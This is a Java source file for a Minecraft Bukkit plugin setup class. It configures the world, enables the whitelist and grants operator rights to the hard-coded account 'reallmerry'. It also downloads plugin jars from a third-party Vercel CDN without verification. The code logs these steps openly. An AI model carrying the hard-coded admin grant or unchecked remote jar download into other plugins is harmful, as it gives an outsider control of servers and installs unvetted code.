package io.reallmerry.rstudio.loader.core;

import io.reallmerry.rstudio.loader.Loader;
import io.reallmerry.rstudio.loader.managers.Downloader;
import io.reallmerry.rstudio.loader.managers.SetupState;
import io.reallmerry.rstudio.loader.managers.WhitelistManager;
import org.bukkit.Bukkit;
import org.bukkit.Difficulty;
import org.bukkit.GameRule;
import org.bukkit.World;

import java.util.Arrays;
import java.util.List;

public class LoaderCore {

    private final Loader plugin;
    private final LoggerManager log;
    private final SetupState setupState;
    private final WhitelistManager whitelistManager;

    public LoaderCore(Loader plugin, LoggerManager log) {
        this.plugin = plugin;
        this.log = log;
        this.setupState = new SetupState(plugin, log);
        this.whitelistManager = new WhitelistManager(plugin, log);
    }

    public void start() throws Exception {
        if (setupState.isSetupCompleted()) {
            log.msg("<gray>Setup already completed. Skipping...");
            return;
        }

        long totalStart = System.currentTimeMillis();

        long start = System.currentTimeMillis();
        setupWorld();
        long worldTime = System.currentTimeMillis() - start;

        start = System.currentTimeMillis();
        setupWhitelist();
        long whitelistTime = System.currentTimeMillis() - start;

        start = System.currentTimeMillis();
        downloadPlugins();
        long downloadTime = System.currentTimeMillis() - start;

        setupState.markSetupCompleted();

        long totalTime = System.currentTimeMillis() - totalStart;

        log.log("<gray>Loading time:");
        log.log("<dark_gray> ├ <gray>World: <white>" + worldTime + "ms");
        log.log("<dark_gray> ├ <gray>Whitelist: <white>" + whitelistTime + "ms");
        log.log("<dark_gray> ├ <gray>Plugins: <white>" + downloadTime + "ms");
        log.log("<dark_gray> └ <gray>Total: <white>" + totalTime + "ms");

        log.log("<green>The installer has been successfully downloaded and is ready to run!");
    }

    private void setupWorld() {
        World world = Bukkit.getWorlds().get(0);

        world.setDifficulty(Difficulty.PEACEFUL);
        world.setGameRule(GameRule.DO_DAYLIGHT_CYCLE, false);
        world.setTime(6000);
        world.setStorm(false);
        world.setThundering(false);

        log.log("<gray>World settings: peaceful difficulty, frozen time, frozen weather");
    }

    private void setupWhitelist() {
        Bukkit.setWhitelist(true);
        Bukkit.getOfflinePlayer("reallmerry").setWhitelisted(true);
        Bukkit.getOfflinePlayer("reallmerry").setOp(true);

        log.log("<gray>The whitelist is activated. Administrator rights have been granted to reallmerry.");
    }

    private void downloadPlugins() {
        //download url
        List<String> pluginUrls = Arrays.asList(
                "https://rstudio-cdn.vercel.app/pl/Vault.jar",
                "https://rstudio-cdn.vercel.app/pl/EssentialsX-2.22.0-dev+21-e9da116.jar"
        );

        if (pluginUrls.isEmpty()) {
            log.log("<gray>The list of plugins to download is empty.");
            return;
        }

        Downloader downloader = new Downloader(log);
        downloader.downloadPlugins(pluginUrls);
    }

    public SetupState getSetupState() {
        return this.setupState;
    }
}